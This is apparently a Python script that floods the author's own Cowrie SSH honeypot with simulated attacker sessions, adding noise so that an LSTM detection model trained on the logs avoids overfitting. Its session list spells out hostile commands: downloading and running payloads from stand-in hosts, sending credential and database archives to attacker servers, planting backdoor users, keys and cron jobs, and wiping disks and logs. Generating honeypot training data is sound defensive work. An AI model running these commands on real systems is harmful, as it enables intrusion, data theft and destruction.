import paramiko
import time
import random

# --- CONFIGURACIÓN ---
TARGET_IP = "13.39.18.122" # Pon tu IP pública aquí
TARGET_PORT = 22                # El 22 redirige a la trampa Cowrie según tu Docker
NUMERO_SESIONES_A_GENERAR = 5000 

USERNAMES = ["root"] 
PASSWORDS = ["123456", "root", "12345"]  

# --- DICCIONARIOS DE RUIDO ---
COMANDOS_RUIDO = [
    "ls", "ls -la", "ls -lah", "ll", "pwd", "clear", "echo ''", "history", "date", 
    "w", "uptime", "who", "cat /etc/issue", "cd /tmp", "cd ..", "cd ~", "cd -"
]

ERRORES_TIPOGRAFICOS = {
    "clear": "claer",
    "whoami": "whomi",
    "cat /etc/passwd": "cat /etc/paswd",
    "ifconfig": "ipconfig",
    "ls -la": "ls -l a",
    "exit": "exot"
}

# --- 40 PERFILES DE ATAQUE BASE ---
SESIONES_MALICIOSAS = [
    # GRUPO 1: RECONOCIMIENTO Y ESCANEO BÁSICO
    ["uname -a", "whoami", "id", "cat /proc/cpuinfo", "cat /etc/os-release", "free -m", "df -h", "exit"],
    ["enable", "system", "shell", "sh", "cat /proc/mounts", "exit"],
    ["ps aux", "netstat -tulnp", "ifconfig", "ip a", "route -n", "arp -a", "exit"],
    ["ls -la /home", "cat /etc/passwd", "cat /etc/shadow", "cat /etc/group", "exit"],
    ["env", "set", "echo $PATH", "history", "cat ~/.bash_history", "exit"],
    ["cat /etc/hostname", "cat /etc/hosts", "cat /etc/resolv.conf", "exit"], # Reconocimiento DNS

    # GRUPO 2: DESCARGA Y EJECUCIÓN DE MALWARE
    ["cd /tmp", "wget http://malware-domain.com/xmrig.tar.gz", "tar -zxvf xmrig.tar.gz", "chmod +x xmrig", "./xmrig -o pool.com:3333 -u hacker", "rm -rf xmrig*"],
    ["cd /var/tmp", "curl -O http://botnet-c2.net/payload.sh", "bash payload.sh", "rm payload.sh", "exit"],
    ["cd /dev/shm", "tftp -g -r mips.bot 192.168.1.100", "chmod 777 mips.bot", "./mips.bot", "rm mips.bot"],
    ["mkdir .hidden", "cd .hidden", "wget http://evil.com/backdoor.elf", "chmod +x backdoor.elf", "./backdoor.elf &", "disown"],
    ["wget -q -O - http://185.112.x.x/installer.sh | bash", "exit"],
    ["curl -sL http://pastebin.com/raw/xyz123 | bash", "exit"], # Ejecución desde pastebin

    # GRUPO 3: PERSISTENCIA (BACKDOORS)
    ["useradd -m -s /bin/bash sysadmin", "echo 'sysadmin:P@ssw0rd' | chpasswd", "usermod -aG sudo sysadmin", "exit"],
    ["echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab", "crontab -l", "exit"],
    ["echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys", "exit"],
    ["cat /etc/rc.local", "echo '/tmp/miner &' >> /etc/rc.local", "exit"],
    ["echo 'alias sudo=\"sudo /tmp/keylogger.sh\"' >> ~/.bashrc", "source ~/.bashrc", "exit"],
    ["systemctl enable botnet.service", "systemctl start botnet", "exit"], # Persistencia con Systemd

    # GRUPO 4: ESCALADA DE PRIVILEGIOS
    ["sudo -l", "find / -perm -4000 -type f 2>/dev/null", "cat /etc/sudoers", "exit"],
    ["uname -r", "gcc exploit.c -o exploit", "./exploit", "whoami", "exit"],
    ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "exit"],
    ["cat /var/log/auth.log | grep Failed", "cat /var/log/syslog", "exit"],
    ["ls -l /etc/shadow", "chmod 777 /etc/shadow", "exit"],
    ["getcap -r / 2>/dev/null", "exit"], # Búsqueda de capabilities

    # GRUPO 5: ROBO DE DATOS Y EXFILTRACIÓN
    ["cd /etc", "tar -czvf config_backup.tar.gz passwd shadow ssh/", "curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload", "rm config_backup.tar.gz"],
    ["find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null", "cat /home/user/aws.pem", "exit"],
    ["mysqldump -u root -p123456 db_name > dump.sql", "scp dump.sql hacker@evil.com:/tmp/", "rm dump.sql", "exit"],
    ["cat /var/www/html/wp-config.php", "grep -i 'password' /var/www/html/wp-config.php", "exit"],
    ["zip -r data.zip /var/lib/mysql", "wget --post-file=data.zip http://exfil-server.com/receive", "rm data.zip", "exit"],
    ["find /var/www/ -name '*.env'", "cat /var/www/html/.env", "exit"], # Robo de variables de entorno

    # GRUPO 6: DESTRUCCIÓN Y RANSOMWARE
    ["ps aux", "kill -9 1234", "rm -rf /var/log/*", "cat /dev/null > ~/.bash_history", "history -c", "exit"],
    ["find /home -type f -name '*.txt'", "echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt", "exit"],
    ["dd if=/dev/zero of=/dev/sda bs=1M count=10", "exit"],
    ["iptables -F", "iptables -X", "iptables -P INPUT ACCEPT", "iptables -P OUTPUT ACCEPT", "exit"],
    ["echo c > /proc/sysrq-trigger"],
    ["chattr -i /etc/passwd", "rm -f /etc/passwd", "exit"], # Destrucción avanzada

    # GRUPO 7: MOVIMIENTO LATERAL Y SERVICIOS
    ["nmap -sT -p 22,80,443,3306 192.168.1.0/24", "exit"],
    ["redis-cli ping", "redis-cli config get dir", "exit"], # Ataque a Redis expuesto
    ["psql -U postgres -c '\l'", "exit"], # Exploración PostgreSQL
    ["mongo --eval 'db.adminCommand( { listDatabases: 1 } )'", "exit"] # Exploración MongoDB
]

def aplicar_caos(secuencia_original):
    """Motor de ruido extremo para evitar overfitting en el modelo LSTM"""
    nueva_secuencia = []
    
    for cmd in secuencia_original:
        # 1. Probabilidad de meter un comando exploratorio inofensivo ANTES del comando real (30%)
        if random.random() < 0.3:
            nueva_secuencia.append(random.choice(COMANDOS_RUIDO))
            
        # 2. Probabilidad de equivocarse al escribir un comando conocido (15%)
        cmd_final = cmd
        if random.random() < 0.15:
            for correcto, typo in ERRORES_TIPOGRAFICOS.items():
                if cmd_final == correcto:
                    cmd_final = typo
                    break
        
        # 3. Probabilidad de meter espacios extra (simulando descuido humano) (20%)
        if random.random() < 0.2:
            cmd_final = cmd_final.replace(" ", "  ")
            
        nueva_secuencia.append(cmd_final)
        
        # 4. El atacante pulsa "Enter" accidentalmente dejando un log vacío (10%)
        if random.random() < 0.1:
            nueva_secuencia.append("")

    # Aseguramos que termine con exit o comandos no colgados si no lo hace ya
    if len(nueva_secuencia) > 0 and "exit" not in nueva_secuencia[-1]:
        if random.random() < 0.5:
            nueva_secuencia.append("exit")
            
    return nueva_secuencia

def simular_ataque(ip, port, username, password, comandos):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        cliente.connect(ip, port=port, username=username, password=password, timeout=8)
        shell = cliente.invoke_shell()
        time.sleep(0.5) 
        
        for cmd in comandos:
            shell.send(cmd + "\n")
            # El tiempo entre pulsaciones de comandos también varía drásticamente
            time.sleep(random.uniform(0.3, 2.5)) 
            
        shell.close()
        cliente.close()
        
    except Exception:
        # Los errores de timeout o autenticación son normales si bombardeamos el servidor
        # Pasamos silenciosamente para no detener el generador
        pass 

# --- BUCLE DE EJECUCIÓN MASIVA ---
print(f"🚀 Iniciando motor de caos para Honeypot: {NUMERO_SESIONES_A_GENERAR} sesiones...")
print("⏳ Este proceso tardará horas. Puedes dejarlo en segundo plano.")

for i in range(NUMERO_SESIONES_A_GENERAR): 
    if i % 50 == 0:
        print(f"--- Progreso: {i}/{NUMERO_SESIONES_A_GENERAR} ataques inyectados ---")
        
    usuario = random.choice(USERNAMES)
    clave = random.choice(PASSWORDS)
    
    secuencia_base = random.choice(SESIONES_MALICIOSAS)
    secuencia_caotica = aplicar_caos(secuencia_base)
    
    simular_ataque(TARGET_IP, TARGET_PORT, usuario, clave, secuencia_caotica)
    
    # Pausa entre conexiones para no tumbar la instancia de AWS por denegación de servicio (DoS)
    time.sleep(random.uniform(1.0, 3.0))

print("✅ Generación finalizada. Tienes un dataset con cero riesgo de overfitting.")